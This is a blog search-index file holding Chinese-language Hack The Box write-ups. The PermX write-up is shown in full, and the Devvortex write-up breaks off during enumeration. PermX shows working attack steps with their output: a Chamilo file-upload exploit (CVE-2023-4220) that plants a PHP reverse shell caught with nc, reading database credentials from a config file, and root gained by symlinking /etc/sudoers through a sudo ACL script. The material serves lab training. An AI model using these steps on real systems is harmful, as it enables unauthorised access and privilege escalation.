<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hackthebox-PermX-Writeup</title>
    <link href="/2024/07/18/Hackthebox-PermX-Writeup/"/>
    <url>/2024/07/18/Hackthebox-PermX-Writeup/</url>
    
    <content type="html"><![CDATA[<p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/.png"></p><h2 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h2><hr><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -Pn -sV -sC -A 10.10.11.23                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 19:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> permx.htb (10.10.11.23)<br>Host is up (0.093s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)<br>|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.52<br>|_http-server-header: Apache/2.4.52 (Ubuntu)<br>|_http-title: eLEARNING<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=7/18%OT=22%CT=1%CU=44253%PV=Y%DS=2%DC=T%G=Y%TM=6698<br>OS:F8BB%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)<br>OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C<br>OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br>OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%<br>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T<br>OS:4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+<br>OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y<br>OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%<br>OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 2 hops<br>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 256/tcp)<br>HOP RTT      ADDRESS<br>1   91.09 ms 10.10.14.1<br>2   91.17 ms permx.htb (10.10.11.23)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 25.06 seconds<br></code></pre></td></tr></table></figure><p>開放端口：</p><ul><li>22&#x2F;tcp open  ssh     OpenSSH 8.9p1</li><li>80&#x2F;tcp open  http    Apache httpd 2.4.52</li></ul><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><hr><p>進入網頁重定向到permx.htb,故將permx.htb加到vhost<br><code>echo &#39;10.10.11.23    permx.htb&#39;|sudo tee -a /etc/hosts</code></p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/.png"></p><h4 id="vhost-爆破"><a href="#vhost-爆破" class="headerlink" title="vhost 爆破"></a>vhost 爆破</h4><hr><p>用wfuzz爆破vhost,發現很多都被重定向</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 404 -H <span class="hljs-string">&quot;Host: FUZZ.permx.htb&quot;</span> http://permx.htb<br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://permx.htb/<br>Total requests: 114441<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload           <br>=====================================================================<br><br>000000003:   302        9 L      26 W       279 Ch      <span class="hljs-string">&quot;ftp&quot;</span>             <br>000000050:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;wiki&quot;</span>            <br>000000049:   302        9 L      26 W       282 Ch      <span class="hljs-string">&quot;server&quot;</span>          <br>000000046:   302        9 L      26 W       279 Ch      <span class="hljs-string">&quot;img&quot;</span>             <br>000000007:   302        9 L      26 W       283 Ch      <span class="hljs-string">&quot;webdisk&quot;</span>         <br>000000015:   302        9 L      26 W       278 Ch      <span class="hljs-string">&quot;ns&quot;</span>              <br>000000047:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;news&quot;</span>            <br>000000048:   302        9 L      26 W       282 Ch      <span class="hljs-string">&quot;portal&quot;</span>          <br>000000031:   302        9 L      26 W       282 Ch      <span class="hljs-string">&quot;mobile&quot;</span>          <br>000000001:   200        586 L    2466 W     36182 Ch    <span class="hljs-string">&quot;www&quot;</span>             <br>000000039:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;dns2&quot;</span>            <br>000000042:   302        9 L      26 W       282 Ch      <span class="hljs-string">&quot;static&quot;</span>          <br>000000037:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;shop&quot;</span>            <br>000000044:   302        9 L      26 W       279 Ch      <span class="hljs-string">&quot;web&quot;</span>             <br>000000041:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;dns1&quot;</span>            <br>000000038:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;demo&quot;</span>            <br>000000045:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;www1&quot;</span><br></code></pre></td></tr></table></figure><p>於是用<code>--hc</code>選項將302的回應過濾掉</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 302,404 -H <span class="hljs-string">&quot;Host: FUZZ.permx.htb&quot;</span> http://permx.htb<br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://permx.htb/<br>Total requests: 114441<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload           <br>=====================================================================<br><br>000000001:   200        586 L    2466 W     36182 Ch    <span class="hljs-string">&quot;www&quot;</span>             <br>000000477:   200        352 L    940 W      19347 Ch    <span class="hljs-string">&quot;lms&quot;</span><br></code></pre></td></tr></table></figure><p>發現vhost <code>lms.permx.htb</code>於是<code>echo &#39;10.10.11.23    lms.permx.htb&#39;|sudo tee -a /etc/hosts</code></p><p>進入網頁後發現是一個叫chamilo的cms系統</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/-1.png"></p><h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><hr><p>google <code>chamilo exploit</code>找到<a href="https://starlabs.sg/advisories/23/23-4220/">CVE-2023-4220 PoC</a></p><p>用pentestmonkey的<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ curl -F <span class="hljs-string">&#x27;bigUploadFile=@php-reverse-shell.php&#x27;</span> <span class="hljs-string">&#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#x27;</span><br>The file has successfully been uploaded.                                                                                   <br>┌──(x㉿kali)-[~]<br>└─$ curl <span class="hljs-string">&#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php&#x27;</span><br><br>┌──(x㉿kali)-[~]<br>└─$ nc -lvnp 1234<br>listening on [any] 1234 ...<br>connect to [10.10.14.53] from (UNKNOWN) [10.10.11.23] 50946<br>Linux permx 5.15.0-113-generic <span class="hljs-comment">#123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span><br> 11:34:01 up 1 day,  5:53,  0 <span class="hljs-built_in">users</span>,  load average: 0.01, 0.05, 0.02<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></code></pre></td></tr></table></figure><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><hr><p>查看本地端口,發現有mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ss -tlp<br>State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess<br>LISTEN 0      128          0.0.0.0:ssh         0.0.0.0:*          <br>LISTEN 0      4096   127.0.0.53%lo:domain      0.0.0.0:*          <br>LISTEN 0      80         127.0.0.1:mysql       0.0.0.0:*          <br>LISTEN 0      511                *:http              *:*          <br>LISTEN 0      128             [::]:ssh            [::]:* <br></code></pre></td></tr></table></figure><p>到configuration.php查看資料庫設定,取得密碼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> /var/www/chamilo/app/config/configuration.php | egrep <span class="hljs-string">&#x27;db_user|db_password&#x27;</span><br><span class="hljs-variable">$_configuration</span>[<span class="hljs-string">&#x27;db_user&#x27;</span>] = <span class="hljs-string">&#x27;chamilo&#x27;</span>;<br><span class="hljs-variable">$_configuration</span>[<span class="hljs-string">&#x27;db_password&#x27;</span>] = <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>查看本地使用者,發現mtz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br>tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false<br>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br>fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>mtz:x:1000:1000:mtz:/home/mtz:/bin/bash<br>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br>mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false<br></code></pre></td></tr></table></figure><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><hr><h3 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ ssh mtz@10.10.11.23<br>mtz@permx:~$ <span class="hljs-built_in">cat</span> ~/user.txt<br>&lt;user flag&gt;<br></code></pre></td></tr></table></figure><p><code>sudo -l</code> 發現<code>/opt/acl.sh</code>可以用<code>sudo</code>執行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz@permx:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> mtz on permx:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,<br>    use_pty<br><br>User mtz may run the following commands on permx:<br>    (ALL : ALL) NOPASSWD: /opt/acl.sh<br></code></pre></td></tr></table></figure><p>這是一個可以用來設定檔案的權限的腳本,並且檔案路徑要以&#x2F;home&#x2F;mtz&#x2F;開頭,而且不能有<code>..</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz@permx:~$ <span class="hljs-built_in">cat</span> /opt/acl.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -ne 3 ]; <span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$0</span> user perm file&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>user=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>perm=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>target=<span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> != /home/mtz/* || <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> == *..* ]]; <span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Access denied.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Check if the path is a file</span><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Target must be a file.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>/usr/bin/sudo /usr/bin/setfacl -m u:<span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$perm</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span><br></code></pre></td></tr></table></figure><h3 id="symbolic-link"><a href="#symbolic-link" class="headerlink" title="symbolic link"></a>symbolic link</h3><hr><p>用<code>ln</code> 建立指向<code>/etc/sudoers</code>的連結以繞過限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz@permx:~$ <span class="hljs-built_in">ln</span> -s /etc/sudoers /home/mtz/sudo<br><br>mtz@permx:~/.ssh$ <span class="hljs-built_in">sudo</span> /opt/acl.sh mtz rw /home/mtz/sudo<br></code></pre></td></tr></table></figure><h3 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h3><hr><p> 將這條加到sudoers</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz    ALL=(ALL:ALL) ALL <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz@permx:~$ <span class="hljs-built_in">sudo</span> su<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> mtz:<br><br><br>root@permx:~# <span class="hljs-built_in">cat</span> root.txt<br>&lt;root flag&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackthebox Machines</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hackthebox-Devvortex-Writeup</title>
    <link href="/2024/07/16/Hackthebox-Devvortex-Writeup/"/>
    <url>/2024/07/16/Hackthebox-Devvortex-Writeup/</url>
    
    <content type="html"><![CDATA[<p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/evvortex.png"></p><h2 id="信息蒐集"><a href="#信息蒐集" class="headerlink" title="信息蒐集"></a>信息蒐集</h2><hr><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> devvortex;<span class="hljs-built_in">cd</span> devvortex<br>                                                                                   <br>┌──(x㉿kali)-[~/devvortex]<br>└─$ <span class="hljs-built_in">export</span> ip=10.10.11.242                            <br>                                                                                   <br>┌──(x㉿kali)-[~/devvortex]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -Pn -A -T4 <span class="hljs-variable">$ip</span><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> x: <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 00:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> devvortex.htb (10.10.11.242)<br>Host is up (0.091s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)<br>|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)<br>|_  256 18:<span class="hljs-built_in">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: DevVortex<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=7/16%OT=22%CT=1%CU=41745%PV=Y%DS=2%DC=T%G=Y%TM=6695<br>OS:50A4%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)<br>OS:SEQ(SP=107%GCD=2%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CS<br>OS:T11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=<br>OS:FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=<br>OS:M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)<br>OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S<br>OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=<br>OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G<br>OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 1720/tcp)<br>HOP RTT      ADDRESS<br>1   93.31 ms 10.10.14.1<br>2   93.35 ms devvortex.htb (10.10.11.242)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 25.58 seconds<br></code></pre></td></tr></table></figure><p>有兩個端口開放：</p><ul><li>22&#x2F;tcp open  ssh     OpenSSH 8.2p1</li><li>80&#x2F;tcp open  http    nginx 1.18.0 (Ubuntu)</li></ul><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>進入網頁無法解析dns,於是手動dns解析<br><code>echo &quot;$ip    devvortex.htb&quot;|sudo tee -a /etc/hosts</code><br>再進入網頁</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/mage.png"></p><p>沒什麼想法,先目錄及vhosts爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~/devvortex]<br>└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb -H <span class="hljs-string">&quot;Host: FUZZ.devvortex.htb&quot;</span> --hc 302        <br><br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://devvortex.htb/<br>Total requests: 114441<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload           <br>=====================================================================<br><br>000000019:   200        501 L    1581 W     23221 Ch    <span class="hljs-string">&quot;dev&quot;</span> <br></code></pre></td></tr></table></figure><p>發現一個vhost: dev.devvortex.htb</p><p><code>echo &quot;$ip    dev.devvortex.htb&quot;|sudo tee -a /etc/hosts</code></p><p>進入<a href="http://dev.devvortex.htb/">http://dev.devvortex.htb/</a><br><img src="/2024/07/12/Hackthebox-Perfection-Writeup/mage-1.png"></p><p>一樣沒什麼東西,目錄爆破看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br> -d 0 -x php<br></code></pre></td></tr></table></figure><p> 爆破出&#x2F;administrator<br> 是一個joomla的後台登入頁面<br> <img 